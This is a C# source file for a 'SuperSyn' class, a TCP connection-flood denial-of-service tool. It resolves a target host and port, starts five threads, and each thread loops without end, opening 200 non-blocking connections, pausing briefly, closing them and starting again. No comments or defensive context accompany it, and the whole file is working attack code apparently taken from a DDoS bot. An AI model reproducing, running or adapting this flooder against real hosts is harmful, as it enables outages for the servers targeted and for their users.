using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

internal class SuperSyn
{
    private ThreadStart[] FloodingJob;
    private Thread[] FloodingThread;
    public string Host;
    private IPEndPoint ipEo;
    public bool IsEnabled;
    public int Port = 80;
    public int SuperSynSockets = 200;
    private SendSyn[] SynClass;
    public int Threads = 5;

    public void StartSuperSyn()
    {
        try
        {
            IPAddress[] addressList = Dns.GetHostEntry(this.Host).AddressList;
            this.ipEo = new IPEndPoint(addressList[0], this.Port);
        }
        catch
        {
            IPAddress address = IPAddress.Parse(this.Host);
            this.ipEo = new IPEndPoint(address, this.Port);
        }
        this.FloodingThread = new Thread[this.Threads];
        this.FloodingJob = new ThreadStart[this.Threads];
        this.SynClass = new SendSyn[this.Threads];
        for (int i = 0; i < this.Threads; i++)
        {
            this.SynClass[i] = new SendSyn(this.ipEo, this.SuperSynSockets);
            this.FloodingJob[i] = new ThreadStart(this.SynClass[i].Send);
            this.FloodingThread[i] = new Thread(this.FloodingJob[i]);
            this.FloodingThread[i].Start();
        }
        this.IsEnabled = true;
    }

    public void StopSuperSyn()
    {
        for (int i = 0; i < this.Threads; i++)
        {
            try
            {
                this.FloodingThread[i].Abort();
                this.FloodingThread[i] = null;
                this.FloodingJob[i] = null;
                this.SynClass[i] = null;
            }
            catch
            {
            }
        }
        this.IsEnabled = false;
    }

    private class SendSyn
    {
        private IPEndPoint ipEo;
        private Socket[] Sock;
        private int SuperSynSockets;

        public SendSyn(IPEndPoint ipEo, int SuperSynSockets)
        {
            this.ipEo = ipEo;
            this.SuperSynSockets = SuperSynSockets;
        }

        public void OnConnect(IAsyncResult ar)
        {
        }

        public void Send()
        {
            while (true)
            {
                int num;
                try
                {
                    this.Sock = new Socket[this.SuperSynSockets];
                    for (num = 0; num < this.SuperSynSockets; num++)
                    {
                        this.Sock[num] = new Socket(this.ipEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                        this.Sock[num].Blocking = false;
                        AsyncCallback callback = new AsyncCallback(this.OnConnect);
                        this.Sock[num].BeginConnect(this.ipEo, callback, this.Sock[num]);
                    }
                    Thread.Sleep(100);
                    for (num = 0; num < this.SuperSynSockets; num++)
                    {
                        if (this.Sock[num].Connected)
                        {
                            this.Sock[num].Disconnect(false);
                        }
                        this.Sock[num].Close();
                        this.Sock[num] = null;
                    }
                    this.Sock = null;
                }
                catch
                {
                    for (num = 0; num < this.SuperSynSockets; num++)
                    {
                        try
                        {
                            if (this.Sock[num].Connected)
                            {
                                this.Sock[num].Disconnect(false);
                            }
                            this.Sock[num].Close();
                            this.Sock[num] = null;
                        }
                        catch
                        {
                        }
                    }
                }
            }
        }
    }
}

